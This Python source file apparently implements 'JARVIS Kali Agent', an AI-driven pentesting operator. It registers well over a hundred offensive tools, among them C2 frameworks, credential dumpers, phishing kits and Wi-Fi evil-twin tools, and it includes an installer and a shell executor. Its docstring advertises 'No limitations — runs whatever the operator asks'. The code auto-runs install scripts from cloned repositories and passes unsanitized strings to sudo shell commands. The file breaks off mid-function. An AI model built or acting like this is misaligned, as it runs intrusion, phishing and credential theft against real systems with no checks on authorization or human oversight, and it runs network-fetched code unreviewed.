# actions/kali_agent.py
"""
JARVIS Kali Agent — Autonomous Pentesting & Offensive Security Operator
The most powerful action module in the JARVIS ecosystem.

Capabilities:
- Full access to ALL Kali Linux tools
- Autonomous tool installation (apt, pip, git clone)
- Browser-based downloads
- Script writing & execution
- Terminal control
- Cross-agent integration (email, browser, file, etc.)
- No limitations — runs whatever the operator asks
- Human-like reasoning & execution flow
- Dual AI brain: Groq (speed) + Gemini (depth)
"""

import os
import sys
import json
import time
import shlex
import shutil
import hashlib
import asyncio
import tempfile
import textwrap
import threading
import traceback
import subprocess
from pathlib import Path
from datetime import datetime
from typing import Optional, Callable, Any

# ── Base Paths ────────────────────────────────────────────────────────────────
BASE_DIR    = Path(__file__).resolve().parent.parent
TOOLS_DIR   = BASE_DIR / "kali_agent_tools"
LOGS_DIR    = BASE_DIR / "kali_agent_logs"

# ── Safe paths — no spaces, no special chars ──────────────────────────────────
_SAFE_BASE  = Path.home() / "jarvis"
SCRIPTS_DIR = _SAFE_BASE / "scripts"
WORKSPACE   = _SAFE_BASE / "workspace"

for _d in [TOOLS_DIR, LOGS_DIR, SCRIPTS_DIR, WORKSPACE]:
    _d.mkdir(parents=True, exist_ok=True)

# ── Gemini Live safe limits ───────────────────────────────────────────────────
GEMINI_LIVE_SAFE_TIMEOUT = 18
MAX_STEP_OUTPUT          = 1500
MAX_FINAL_OUTPUT         = 3000

# ── Long-running tools — always backgrounded ─────────────────────────────────
LONG_RUNNING_TOOLS = [
    "amass", "masscan", "nikto", "wifite",
    "airodump-ng", "responder", "hydra",
    "medusa", "wpscan", "gobuster", "ffuf",
    "nmap", "sqlmap", "hashcat", "john",
    "bettercap", "kismet", "aireplay-ng",
]

# ── Groq Model Registry ───────────────────────────────────────────────────────
GROQ_MODELS = {
    "fast":    "llama-3.1-8b-instant",
    "default": "llama-3.3-70b-versatile",
    "smart":   "llama-3.3-70b-versatile",
    "code":    "llama-3.3-70b-versatile",
    "deep":    "deepseek-r1-distill-llama-70b",
    "mixtral": "mixtral-8x7b-32768",
}

# ── Kali Tool Registry ────────────────────────────────────────────────────────
KALI_TOOL_REGISTRY = {

    "information_gathering": {
        "nmap":           {"cmd": "nmap",           "install": "apt", "pkg": "nmap",                 "desc": "Network scanner"},
        "masscan":        {"cmd": "masscan",         "install": "apt", "pkg": "masscan",              "desc": "Fast port scanner"},
        "netdiscover":    {"cmd": "netdiscover",     "install": "apt", "pkg": "netdiscover",          "desc": "ARP scanner"},
        "arp-scan":       {"cmd": "arp-scan",        "install": "apt", "pkg": "arp-scan",             "desc": "ARP scanner"},
        "dmitry":         {"cmd": "dmitry",          "install": "apt", "pkg": "dmitry",               "desc": "Info gatherer"},
        "maltego":        {"cmd": "maltego",         "install": "apt", "pkg": "maltego",              "desc": "OSINT platform"},
        "recon-ng":       {"cmd": "recon-ng",        "install": "apt", "pkg": "recon-ng",             "desc": "Recon framework"},
        "theharvester":   {"cmd": "theHarvester",    "install": "apt", "pkg": "theharvester",         "desc": "Email/domain OSINT"},
        "shodan":         {"cmd": "shodan",          "install": "pip", "pkg": "shodan",               "desc": "Shodan CLI"},
        "spiderfoot":     {"cmd": "spiderfoot",      "install": "apt", "pkg": "spiderfoot",           "desc": "OSINT automation"},
        "amass":          {"cmd": "amass",           "install": "apt", "pkg": "amass",                "desc": "DNS enumeration"},
        "subfinder":      {"cmd": "subfinder",       "install": "git", "pkg": "https://github.com/projectdiscovery/subfinder", "desc": "Subdomain finder"},
        "dnsenum":        {"cmd": "dnsenum",         "install": "apt", "pkg": "dnsenum",              "desc": "DNS enum"},
        "dnsrecon":       {"cmd": "dnsrecon",        "install": "apt", "pkg": "dnsrecon",             "desc": "DNS recon"},
        "fierce":         {"cmd": "fierce",          "install": "apt", "pkg": "fierce",               "desc": "DNS brute force"},
        "whois":          {"cmd": "whois",           "install": "apt", "pkg": "whois",                "desc": "WHOIS lookup"},
        "whatweb":        {"cmd": "whatweb",         "install": "apt", "pkg": "whatweb",              "desc": "Web fingerprint"},
        "wafw00f":        {"cmd": "wafw00f",         "install": "pip", "pkg": "wafw00f",              "desc": "WAF detector"},
        "wapiti":         {"cmd": "wapiti",          "install": "apt", "pkg": "wapiti",               "desc": "Web scanner"},
        "nikto":          {"cmd": "nikto",           "install": "apt", "pkg": "nikto",                "desc": "Web vuln scanner"},
        "enum4linux":     {"cmd": "enum4linux",      "install": "apt", "pkg": "enum4linux",           "desc": "SMB enum"},
        "smbclient":      {"cmd": "smbclient",       "install": "apt", "pkg": "smbclient",            "desc": "SMB client"},
        "ldapsearch":     {"cmd": "ldapsearch",      "install": "apt", "pkg": "ldap-utils",           "desc": "LDAP enum"},
        "snmpwalk":       {"cmd": "snmpwalk",        "install": "apt", "pkg": "snmp",                 "desc": "SNMP walk"},
        "onesixtyone":    {"cmd": "onesixtyone",     "install": "apt", "pkg": "onesixtyone",          "desc": "SNMP scanner"},
        "p0f":            {"cmd": "p0f",             "install": "apt", "pkg": "p0f",                  "desc": "Passive OS finger"},
        "hping3":         {"cmd": "hping3",          "install": "apt", "pkg": "hping3",               "desc": "Packet crafter"},
        "traceroute":     {"cmd": "traceroute",      "install": "apt", "pkg": "traceroute",           "desc": "Route tracer"},
        "dig":            {"cmd": "dig",             "install": "apt", "pkg": "dnsutils",             "desc": "DNS lookup"},
        "host":           {"cmd": "host",            "install": "apt", "pkg": "dnsutils",             "desc": "DNS lookup"},
        "ping":           {"cmd": "ping",            "install": "apt", "pkg": "iputils-ping",         "desc": "ICMP ping"},
    },

    "vulnerability_analysis": {
        "nikto":                   {"cmd": "nikto",             "install": "apt", "pkg": "nikto",                    "desc": "Web vuln scanner"},
        "openvas":                 {"cmd": "openvas",           "install": "apt", "pkg": "openvas",                  "desc": "Vuln scanner"},
        "lynis":                   {"cmd": "lynis",             "install": "apt", "pkg": "lynis",                    "desc": "Linux auditor"},
        "unix-privesc-check":      {"cmd": "unix-privesc-check","install": "apt", "pkg": "unix-privesc-check",        "desc": "PrivEsc checker"},
        "linux-exploit-suggester": {"cmd": "les.sh",            "install": "git", "pkg": "https://github.com/mzet-/linux-exploit-suggester", "desc": "Exploit suggester"},
        "linpeas":                 {"cmd": "linpeas.sh",        "install": "git", "pkg": "https://github.com/carlospolop/PEASS-ng",           "desc": "PrivEsc enum"},
        "winpeas":                 {"cmd": "winpeas.exe",       "install": "git", "pkg": "https://github.com/carlospolop/PEASS-ng",           "desc": "Windows PrivEsc"},
        "searchsploit":            {"cmd": "searchsploit",      "install": "apt", "pkg": "exploitdb",                "desc": "ExploitDB search"},
    },

    "exploitation": {
        "metasploit":   {"cmd": "msfconsole",        "install": "apt", "pkg": "metasploit-framework", "desc": "Metasploit framework"},
        "msfvenom":     {"cmd": "msfvenom",          "install": "apt", "pkg": "metasploit-framework", "desc": "Payload generator"},
        "sqlmap":       {"cmd": "sqlmap",            "install": "apt", "pkg": "sqlmap",               "desc": "SQL injection"},
        "xsstrike":     {"cmd": "xsstrike",          "install": "git", "pkg": "https://github.com/s0md3v/XSStrike",        "desc": "XSS scanner"},
        "commix":       {"cmd": "commix",            "install": "apt", "pkg": "commix",               "desc": "Command injection"},
        "beef":         {"cmd": "beef-xss",          "install": "apt", "pkg": "beef-xss",             "desc": "Browser exploit"},
        "routersploit": {"cmd": "rsf",               "install": "git", "pkg": "https://github.com/threat9/routersploit",   "desc": "Router exploit"},
        "empire":       {"cmd": "powershell-empire", "install": "git", "pkg": "https://github.com/BC-SECURITY/Empire",     "desc": "Post-exploit C2"},
        "crackmapexec": {"cmd": "crackmapexec",      "install": "apt", "pkg": "crackmapexec",         "desc": "Network attack"},
        "evil-winrm":   {"cmd": "evil-winrm",        "install": "gem", "pkg": "evil-winrm",           "desc": "WinRM shell"},
        "impacket":     {"cmd": "impacket-psexec",   "install": "pip", "pkg": "impacket",             "desc": "Network protocols"},
        "pwntools":     {"cmd": "pwn",               "install": "pip", "pkg": "pwntools",             "desc": "CTF toolkit"},
        "gdb":          {"cmd": "gdb",               "install": "apt", "pkg": "gdb",                  "desc": "Debugger"},
        "ropper":       {"cmd": "ropper",            "install": "pip", "pkg": "ropper",               "desc": "ROP gadgets"},
        "pwndbg":       {"cmd": "gdb",               "install": "git", "pkg": "https://github.com/pwndbg/pwndbg",          "desc": "GDB pwndbg"},
    },

    "post_exploitation": {
        "meterpreter":  {"cmd": "msfconsole",         "install": "apt", "pkg": "metasploit-framework", "desc": "Meterpreter"},
        "empire":       {"cmd": "powershell-empire",  "install": "git", "pkg": "https://github.com/BC-SECURITY/Empire",   "desc": "Empire C2"},
        "sliver":       {"cmd": "sliver",             "install": "git", "pkg": "https://github.com/BishopFox/sliver",      "desc": "C2 framework"},
        "havoc":        {"cmd": "havoc",              "install": "git", "pkg": "https://github.com/HavocFramework/Havoc",  "desc": "C2 framework"},
        "mimikatz":     {"cmd": "mimikatz",           "install": "git", "pkg": "https://github.com/gentilkiwi/mimikatz",   "desc": "Credential dump"},
        "bloodhound":   {"cmd": "bloodhound",         "install": "apt", "pkg": "bloodhound",           "desc": "AD attack paths"},
        "crackmapexec": {"cmd": "crackmapexec",       "install": "apt", "pkg": "crackmapexec",         "desc": "Lateral movement"},
        "proxychains":  {"cmd": "proxychains4",       "install": "apt", "pkg": "proxychains4",         "desc": "Proxy chains"},
        "chisel":       {"cmd": "chisel",             "install": "git", "pkg": "https://github.com/jpillora/chisel",       "desc": "TCP tunnel"},
        "ligolo-ng":    {"cmd": "ligolo-ng",          "install": "git", "pkg": "https://github.com/nicocha30/ligolo-ng",   "desc": "Tunneling tool"},
    },

    "wireless": {
        "aircrack-ng":  {"cmd": "aircrack-ng",  "install": "apt", "pkg": "aircrack-ng",  "desc": "WiFi cracker"},
        "airmon-ng":    {"cmd": "airmon-ng",    "install": "apt", "pkg": "aircrack-ng",  "desc": "Monitor mode"},
        "airodump-ng":  {"cmd": "airodump-ng",  "install": "apt", "pkg": "aircrack-ng",  "desc": "Packet capture"},
        "aireplay-ng":  {"cmd": "aireplay-ng",  "install": "apt", "pkg": "aircrack-ng",  "desc": "Packet inject"},
        "wifite":       {"cmd": "wifite",       "install": "apt", "pkg": "wifite",       "desc": "Auto WiFi attack"},
        "bettercap":    {"cmd": "bettercap",    "install": "apt", "pkg": "bettercap",    "desc": "Network interceptor"},
        "hostapd-wpe":  {"cmd": "hostapd-wpe",  "install": "apt", "pkg": "hostapd-wpe", "desc": "Evil AP"},
        "fluxion":      {"cmd": "fluxion",      "install": "git", "pkg": "https://github.com/FluxionNetwork/fluxion", "desc": "Evil twin"},
        "kismet":       {"cmd": "kismet",       "install": "apt", "pkg": "kismet",       "desc": "Wireless detector"},
        "wash":         {"cmd": "wash",         "install": "apt", "pkg": "reaver",       "desc": "WPS scanner"},
        "reaver":       {"cmd": "reaver",       "install": "apt", "pkg": "reaver",       "desc": "WPS attack"},
        "pixiewps":     {"cmd": "pixiewps",     "install": "apt", "pkg": "pixiewps",     "desc": "WPS pixie dust"},
        "mdk4":         {"cmd": "mdk4",         "install": "apt", "pkg": "mdk4",         "desc": "WiFi jammer"},
        "wifiphisher":  {"cmd": "wifiphisher",  "install": "git", "pkg": "https://github.com/wifiphisher/wifiphisher", "desc": "WiFi phishing"},
    },

    "password_attacks": {
        "hydra":     {"cmd": "hydra",      "install": "apt", "pkg": "hydra",      "desc": "Online brute force"},
        "medusa":    {"cmd": "medusa",     "install": "apt", "pkg": "medusa",     "desc": "Parallel brute force"},
        "hashcat":   {"cmd": "hashcat",    "install": "apt", "pkg": "hashcat",    "desc": "GPU hash cracker"},
        "john":      {"cmd": "john",       "install": "apt", "pkg": "john",       "desc": "Password cracker"},
        "crunch":    {"cmd": "crunch",     "install": "apt", "pkg": "crunch",     "desc": "Wordlist generator"},
        "cewl":      {"cmd": "cewl",       "install": "apt", "pkg": "cewl",       "desc": "Custom wordlist"},
        "cupp":      {"cmd": "cupp",       "install": "apt", "pkg": "cupp",       "desc": "Profile wordlist"},
        "rsmangler": {"cmd": "rsmangler",  "install": "apt", "pkg": "rsmangler",  "desc": "Wordlist mangler"},
        "ophcrack":  {"cmd": "ophcrack",   "install": "apt", "pkg": "ophcrack",   "desc": "Windows hash crack"},
        "samdump2":  {"cmd": "samdump2",   "install": "apt", "pkg": "samdump2",   "desc": "SAM dump"},
        "chntpw":    {"cmd": "chntpw",     "install": "apt", "pkg": "chntpw",     "desc": "NT password reset"},
        "fcrackzip": {"cmd": "fcrackzip",  "install": "apt", "pkg": "fcrackzip",  "desc": "ZIP cracker"},
        "pdfcrack":  {"cmd": "pdfcrack",   "install": "apt", "pkg": "pdfcrack",   "desc": "PDF cracker"},
        "ncrack":    {"cmd": "ncrack",     "install": "apt", "pkg": "ncrack",     "desc": "Network cracker"},
        "patator":   {"cmd": "patator",    "install": "apt", "pkg": "patator",    "desc": "Multi-purpose brute"},
    },

    "web_application": {
        "burpsuite":  {"cmd": "burpsuite",    "install": "apt", "pkg": "burpsuite",    "desc": "Web proxy"},
        "zaproxy":    {"cmd": "zaproxy",      "install": "apt", "pkg": "zaproxy",      "desc": "OWASP ZAP"},
        "sqlmap":     {"cmd": "sqlmap",       "install": "apt", "pkg": "sqlmap",       "desc": "SQL injection"},
        "nikto":      {"cmd": "nikto",        "install": "apt", "pkg": "nikto",        "desc": "Web scanner"},
        "gobuster":   {"cmd": "gobuster",     "install": "apt", "pkg": "gobuster",     "desc": "Dir/DNS brute"},
        "ffuf":       {"cmd": "ffuf",         "install": "apt", "pkg": "ffuf",         "desc": "Web fuzzer"},
        "wfuzz":      {"cmd": "wfuzz",        "install": "apt", "pkg": "wfuzz",        "desc": "Web fuzzer"},
        "dirb":       {"cmd": "dirb",         "install": "apt", "pkg": "dirb",         "desc": "Dir scanner"},
        "dirsearch":  {"cmd": "dirsearch",    "install": "git", "pkg": "https://github.com/maurosoria/dirsearch",      "desc": "Dir search"},
        "xsstrike":   {"cmd": "xsstrike",     "install": "git", "pkg": "https://github.com/s0md3v/XSStrike",          "desc": "XSS scanner"},
        "commix":     {"cmd": "commix",       "install": "apt", "pkg": "commix",       "desc": "Command injection"},
        "beef-xss":   {"cmd": "beef-xss",     "install": "apt", "pkg": "beef-xss",     "desc": "Browser exploit"},
        "w3af":       {"cmd": "w3af_console", "install": "apt", "pkg": "w3af",         "desc": "Web attack framework"},
        "skipfish":   {"cmd": "skipfish",     "install": "apt", "pkg": "skipfish",     "desc": "Web recon"},
        "wpscan":     {"cmd": "wpscan",       "install": "gem", "pkg": "wpscan",       "desc": "WordPress scanner"},
        "joomscan":   {"cmd": "joomscan",     "install": "apt", "pkg": "joomscan",     "desc": "Joomla scanner"},
        "droopescan": {"cmd": "droopescan",   "install": "pip", "pkg": "droopescan",   "desc": "Drupal scanner"},
        "nuclei":     {"cmd": "nuclei",       "install": "git", "pkg": "https://github.com/projectdiscovery/nuclei",  "desc": "Vuln scanner"},
        "httpx":      {"cmd": "httpx",        "install": "git", "pkg": "https://github.com/projectdiscovery/httpx",   "desc": "HTTP probe"},
        "katana":     {"cmd": "katana",       "install": "git", "pkg": "https://github.com/projectdiscovery/katana",  "desc": "Web crawler"},
        "arjun":      {"cmd": "arjun",        "install": "pip", "pkg": "arjun",        "desc": "HTTP param finder"},
        "dalfox":     {"cmd": "dalfox",       "install": "git", "pkg": "https://github.com/hahwul/dalfox",           "desc": "XSS scanner"},
    },

    "sniffing_spoofing": {
        "wireshark":   {"cmd": "wireshark",   "install": "apt", "pkg": "wireshark",   "desc": "Packet analyzer"},
        "tshark":      {"cmd": "tshark",      "install": "apt", "pkg": "tshark",      "desc": "CLI Wireshark"},
        "tcpdump":     {"cmd": "tcpdump",     "install": "apt", "pkg": "tcpdump",     "desc": "Packet capture"},
        "bettercap":   {"cmd": "bettercap",   "install": "apt", "pkg": "bettercap",   "desc": "Network interceptor"},
        "ettercap":    {"cmd": "ettercap",    "install": "apt", "pkg": "ettercap",    "desc": "MITM tool"},
        "arpspoof":    {"cmd": "arpspoof",    "install": "apt", "pkg": "dsniff",      "desc": "ARP spoof"},
        "responder":   {"cmd": "responder",   "install": "apt", "pkg": "responder",   "desc": "LLMNR/NBT-NS poison"},
        "mitmproxy":   {"cmd": "mitmproxy",   "install": "pip", "pkg": "mitmproxy",   "desc": "MITM proxy"},
        "scapy":       {"cmd": "scapy",       "install": "pip", "pkg": "scapy",       "desc": "Packet manipulation"},
        "netsniff-ng": {"cmd": "netsniff-ng", "install": "apt", "pkg": "netsniff-ng", "desc": "Network analyzer"},
        "dsniff":      {"cmd": "dsniff",      "install": "apt", "pkg": "dsniff",      "desc": "Password sniffer"},
        "macchanger":  {"cmd": "macchanger",  "install": "apt", "pkg": "macchanger",  "desc": "MAC changer"},
        "yersinia":    {"cmd": "yersinia",    "install": "apt", "pkg": "yersinia",    "desc": "Protocol attacks"},
        "sslstrip":    {"cmd": "sslstrip",    "install": "apt", "pkg": "sslstrip",    "desc": "SSL strip"},
        "dnsspoof":    {"cmd": "dnsspoof",    "install": "apt", "pkg": "dsniff",      "desc": "DNS spoof"},
    },

    "forensics": {
        "autopsy":        {"cmd": "autopsy",        "install": "apt", "pkg": "autopsy",               "desc": "Digital forensics"},
        "volatility":     {"cmd": "vol",            "install": "apt", "pkg": "volatility3",           "desc": "Memory forensics"},
        "foremost":       {"cmd": "foremost",       "install": "apt", "pkg": "foremost",              "desc": "File recovery"},
        "binwalk":        {"cmd": "binwalk",        "install": "apt", "pkg": "binwalk",               "desc": "Firmware analysis"},
        "bulk-extractor": {"cmd": "bulk_extractor", "install": "apt", "pkg": "bulk-extractor",        "desc": "Forensic extractor"},
        "exiftool":       {"cmd": "exiftool",       "install": "apt", "pkg": "libimage-exiftool-perl", "desc": "EXIF data"},
        "steghide":       {"cmd": "steghide",       "install": "apt", "pkg": "steghide",              "desc": "Steganography"},
        "stegcracker":    {"cmd": "stegcracker",    "install": "pip", "pkg": "stegcracker",           "desc": "Stego cracker"},
        "zsteg":          {"cmd": "zsteg",          "install": "gem", "pkg": "zsteg",                 "desc": "PNG stego"},
        "hexedit":        {"cmd": "hexedit",        "install": "apt", "pkg": "hexedit",               "desc": "Hex editor"},
        "dc3dd":          {"cmd": "dc3dd",          "install": "apt", "pkg": "dc3dd",                 "desc": "Forensic imaging"},
        "ddrescue":       {"cmd": "ddrescue",       "install": "apt", "pkg": "gddrescue",             "desc": "Data recovery"},
        "sleuthkit":      {"cmd": "fls",            "install": "apt", "pkg": "sleuthkit",             "desc": "File system forensics"},
        "scalpel":        {"cmd": "scalpel",        "install": "apt", "pkg": "scalpel",               "desc": "File carver"},
        "testdisk":       {"cmd": "testdisk",       "install": "apt", "pkg": "testdisk",              "desc": "Partition recovery"},
    },

    "reverse_engineering": {
        "ghidra":   {"cmd": "ghidra",   "install": "apt", "pkg": "ghidra",      "desc": "NSA RE tool"},
        "radare2":  {"cmd": "r2",       "install": "apt", "pkg": "radare2",     "desc": "RE framework"},
        "gdb":      {"cmd": "gdb",      "install": "apt", "pkg": "gdb",         "desc": "Debugger"},
        "objdump":  {"cmd": "objdump",  "install": "apt", "pkg": "binutils",    "desc": "Object dumper"},
        "strings":  {"cmd": "strings",  "install": "apt", "pkg": "binutils",    "desc": "String extractor"},
        "ltrace":   {"cmd": "ltrace",   "install": "apt", "pkg": "ltrace",      "desc": "Library tracer"},
        "strace":   {"cmd": "strace",   "install": "apt", "pkg": "strace",      "desc": "System call tracer"},
        "apktool":  {"cmd": "apktool",  "install": "apt", "pkg": "apktool",     "desc": "APK tool"},
        "jadx":     {"cmd": "jadx",     "install": "apt", "pkg": "jadx",        "desc": "Java decompiler"},
        "angr":     {"cmd": "angr",     "install": "pip", "pkg": "angr",        "desc": "Binary analysis"},
        "frida":    {"cmd": "frida",    "install": "pip", "pkg": "frida-tools",  "desc": "Dynamic instrument"},
        "rizin":    {"cmd": "rizin",    "install": "apt", "pkg": "rizin",       "desc": "RE toolkit"},
        "cutter":   {"cmd": "cutter",   "install": "apt", "pkg": "cutter",      "desc": "Rizin GUI"},
        "pwntools": {"cmd": "pwn",      "install": "pip", "pkg": "pwntools",    "desc": "CTF toolkit"},
    },

    "social_engineering": {
        "setoolkit":    {"cmd": "setoolkit",    "install": "apt", "pkg": "set",          "desc": "SE toolkit"},
        "gophish":      {"cmd": "gophish",      "install": "git", "pkg": "https://github.com/gophish/gophish",         "desc": "Phishing platform"},
        "evilginx2":    {"cmd": "evilginx2",    "install": "git", "pkg": "https://github.com/kgretzky/evilginx2",      "desc": "MITM phishing"},
        "king-phisher": {"cmd": "king-phisher", "install": "git", "pkg": "https://github.com/rsmusllp/king-phisher",   "desc": "Phishing campaign"},
        "zphisher":     {"cmd": "zphisher",     "install": "git", "pkg": "https://github.com/htr-tech/zphisher",       "desc": "Phishing tool"},
        "blackeye":     {"cmd": "blackeye",     "install": "git", "pkg": "https://github.com/An0nUD4Y/blackeye",       "desc": "Phishing pages"},
    },

    "networking": {
        "netcat":      {"cmd": "nc",           "install": "apt", "pkg": "netcat-openbsd", "desc": "Net utility"},
        "socat":       {"cmd": "socat",        "install": "apt", "pkg": "socat",          "desc": "Socket relay"},
        "ncat":        {"cmd": "ncat",         "install": "apt", "pkg": "ncat",           "desc": "Netcat enhanced"},
        "curl":        {"cmd": "curl",         "install": "apt", "pkg": "curl",           "desc": "HTTP client"},
        "wget":        {"cmd": "wget",         "install": "apt", "pkg": "wget",           "desc": "File downloader"},
        "proxychains": {"cmd": "proxychains4", "install": "apt", "pkg": "proxychains4",   "desc": "Proxy chains"},
        "tor":         {"cmd": "tor",          "install": "apt", "pkg": "tor",            "desc": "TOR network"},
        "stunnel":     {"cmd": "stunnel4",     "install": "apt", "pkg": "stunnel4",       "desc": "SSL tunnel"},
        "iodine":      {"cmd": "iodine",       "install": "apt", "pkg": "iodine",         "desc": "DNS tunnel"},
        "chisel":      {"cmd": "chisel",       "install": "git", "pkg": "https://github.com/jpillora/chisel", "desc": "TCP tunnel"},
        "sshuttle":    {"cmd": "sshuttle",     "install": "pip", "pkg": "sshuttle",       "desc": "VPN over SSH"},
        "openvpn":     {"cmd": "openvpn",      "install": "apt", "pkg": "openvpn",        "desc": "VPN"},
        "ssh":         {"cmd": "ssh",          "install": "apt", "pkg": "openssh-client", "desc": "SSH client"},
    },

    "crypto": {
        "openssl":         {"cmd": "openssl",         "install": "apt", "pkg": "openssl",           "desc": "SSL toolkit"},
        "gpg":             {"cmd": "gpg",             "install": "apt", "pkg": "gpg",               "desc": "Encryption"},
        "hashid":          {"cmd": "hashid",          "install": "pip", "pkg": "hashid",            "desc": "Hash identifier"},
        "hash-identifier": {"cmd": "hash-identifier", "install": "apt", "pkg": "hash-identifier",   "desc": "Hash identifier"},
        "rsatool":         {"cmd": "rsatool",         "install": "pip", "pkg": "rsatool",           "desc": "RSA tool"},
        "xortool":         {"cmd": "xortool",         "install": "pip", "pkg": "xortool",           "desc": "XOR analysis"},
        "ciphey":          {"cmd": "ciphey",          "install": "pip", "pkg": "ciphey",            "desc": "Auto decrypt"},
    },

    "reporting": {
        "pipal":   {"cmd": "pipal",   "install": "apt", "pkg": "pipal",           "desc": "Password stats"},
        "dradis":  {"cmd": "dradis",  "install": "gem", "pkg": "dradis",          "desc": "Report platform"},
        "faraday": {"cmd": "faraday", "install": "pip", "pkg": "faraday-client",  "desc": "Pentest platform"},
        "pwndoc":  {"cmd": "pwndoc",  "install": "git", "pkg": "https://github.com/pwndoc/pwndoc", "desc": "Report tool"},
    },

    "miscellaneous": {
        "tmux":    {"cmd": "tmux",    "install": "apt", "pkg": "tmux",        "desc": "Terminal multiplexer"},
        "screen":  {"cmd": "screen",  "install": "apt", "pkg": "screen",      "desc": "Terminal manager"},
        "vim":     {"cmd": "vim",     "install": "apt", "pkg": "vim",         "desc": "Text editor"},
        "python3": {"cmd": "python3", "install": "apt", "pkg": "python3",     "desc": "Python runtime"},
        "ruby":    {"cmd": "ruby",    "install": "apt", "pkg": "ruby",        "desc": "Ruby runtime"},
        "go":      {"cmd": "go",      "install": "apt", "pkg": "golang",      "desc": "Go runtime"},
        "docker":  {"cmd": "docker",  "install": "apt", "pkg": "docker.io",   "desc": "Container runtime"},
        "git":     {"cmd": "git",     "install": "apt", "pkg": "git",         "desc": "Version control"},
        "rsync":   {"cmd": "rsync",   "install": "apt", "pkg": "rsync",       "desc": "File sync"},
        "7z":      {"cmd": "7z",      "install": "apt", "pkg": "p7zip-full",  "desc": "Archive tool"},
        "jq":      {"cmd": "jq",      "install": "apt", "pkg": "jq",          "desc": "JSON processor"},
    },
}


# ── Logging ───────────────────────────────────────────────────────────────────
class KaliLogger:
    def __init__(self):
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file   = LOGS_DIR / f"session_{self.session_id}.log"

    def log(self, level: str, msg: str, player=None):
        ts    = datetime.now().strftime("%H:%M:%S")
        entry = f"[{ts}][{level}] {msg}"
        print(entry)
        try:
            with open(self.log_file, "a") as f:
                f.write(entry + "\n")
        except Exception:
            pass
        if player:
            try:
                player.write_log(f"[KALI] {msg[:120]}")
            except Exception:
                pass

    def info(self,    msg, player=None): self.log("INFO",  msg, player)
    def warn(self,    msg, player=None): self.log("WARN",  msg, player)
    def error(self,   msg, player=None): self.log("ERROR", msg, player)
    def success(self, msg, player=None): self.log("OK",    msg, player)


_logger = KaliLogger()


# ── Tool Installation Engine ──────────────────────────────────────────────────
class ToolInstaller:

    def __init__(self, player=None, speak: Callable = None):
        self.player = player
        self.speak  = speak

    def _run(self, cmd: str, timeout: int = 300) -> tuple:
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True,
                text=True, timeout=timeout,
            )
            out = (result.stdout + result.stderr).strip()
            return result.returncode == 0, out
        except subprocess.TimeoutExpired:
            return False, f"Timed out after {timeout}s"
        except Exception as e:
            return False, str(e)

    def is_installed(self, cmd: str) -> bool:
        return shutil.which(cmd.split("+")[0]) is not None

    def install(self, tool_name: str, method: str, package: str) -> tuple:
        _logger.info(f"Installing {tool_name} via {method}...", self.player)
        if self.speak:
            self.speak(f"Installing {tool_name}, please stand by sir.")

        if method == "apt":
            ok, out = self._run(
                f"sudo apt-get install -y {package} 2>&1", timeout=300
            )
            if not ok:
                self._run("sudo apt-get update -y 2>&1", timeout=120)
                ok, out = self._run(
                    f"sudo apt-get install -y {package} 2>&1", timeout=300
                )
            return ok, out

        elif method == "pip":
            ok, out = self._run(
                f"pip3 install {package} 2>&1 || pip install {package} 2>&1",
                timeout=180,
            )
            return ok, out

        elif method == "gem":
            ok, out = self._run(f"gem install {package} 2>&1", timeout=180)
            return ok, out

        elif method == "git":
            repo_name  = package.rstrip("/").split("/")[-1]
            clone_path = TOOLS_DIR / repo_name
            if clone_path.exists():
                ok, out = self._run(
                    f"git -C '{clone_path}' pull 2>&1", timeout=120
                )
                return ok, f"Updated: {clone_path}\n{out}"
            ok, out = self._run(
                f"git clone --depth=1 '{package}' '{clone_path}' 2>&1",
                timeout=300,
            )
            if ok:
                for inst_cmd, check_file in [
                    (f"cd '{clone_path}' && pip3 install -r requirements.txt 2>&1", clone_path / "requirements.txt"),
                    (f"cd '{clone_path}' && python3 setup.py install 2>&1",         clone_path / "setup.py"),
                    (f"cd '{clone_path}' && make install 2>&1",                     clone_path / "Makefile"),
                    (f"bash '{clone_path}/install.sh' 2>&1",                        clone_path / "install.sh"),
                ]:
                    if check_file.exists():
                        self._run(inst_cmd, timeout=180)
            return ok, f"Cloned to {clone_path}\n{out}"

        elif method == "manual":
            return False, f"{tool_name} requires manual installation."

        return False, f"Unknown install method: {method}"

    def ensure_tool(self, tool_name: str) -> tuple:
        for category, tools in KALI_TOOL_REGISTRY.items():
            if tool_name.lower() in tools:
                info = tools[tool_name.lower()]
                cmd  = info["cmd"].split("+")[0]
                if self.is_installed(cmd):
                    return True, f"{tool_name} already installed."
                return self.install(tool_name, info["install"], info["pkg"])
        _logger.warn(f"{tool_name} not in registry — trying direct...", self.player)
        ok, out = self._run(f"sudo apt-get install -y {tool_name} 2>&1", timeout=300)
        if not ok:
            ok, out = self._run(f"pip3 install {tool_name} 2>&1", timeout=180)
        return ok, out


# ── Command Execution Engine ──────────────────────────────────────────────────
class CommandExecutor:

    def __init__(self, player=None, speak: Callable = None):
        self.player    = player
        self.speak     = speak
        self.processes = {}
        self._lock     = threading.Lock()

    def run_command(
        self,
        command:    str,
        timeout:    int  = 300,
        background: bool = False,
        cwd:        str  = None,
        env_vars:   dict = None,
        sudo:       bool = False,
        capture:    bool = True,
        proc_id:    str  = None,
    ) -> dict:
        if sudo and not command.strip().startswith("sudo"):
            command = f"sudo {command}"

        env = os.environ.copy()
        if env_vars:
            env.update(env_vars)

        # ── Safe working directory ────────────────────────────────────────────
        working_dir = cwd or str(WORKSPACE)
        try:
            Path(working_dir).mkdir(parents=True, exist_ok=True)
        except Exception:
            working_dir = str(Path.home())

        _logger.info(f"EXEC: {command[:120]}", self.player)

        try:
            if background:
                proc = subprocess.Popen(
                    command, shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    cwd=working_dir, env=env,
                    preexec_fn=os.setsid,
                )
                pid     = proc.pid
                proc_id = proc_id or f"proc_{pid}"
                with self._lock:
                    self.processes[proc_id] = proc
                return {
                    "success":    True,
                    "output":     f"Started background (PID {pid}, ID {proc_id})",
                    "returncode": 0,
                    "pid":        pid,
                    "proc_id":    proc_id,
                    "background": True,
                }

            proc = subprocess.Popen(
                command, shell=True,
                stdout=subprocess.PIPE if capture else None,
                stderr=subprocess.PIPE if capture else None,
                cwd=working_dir, env=env,
                text=True,
            )
            pid = proc.pid
            if proc_id:
                with self._lock:
                    self.processes[proc_id] = proc

            try:
                stdout, stderr = proc.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
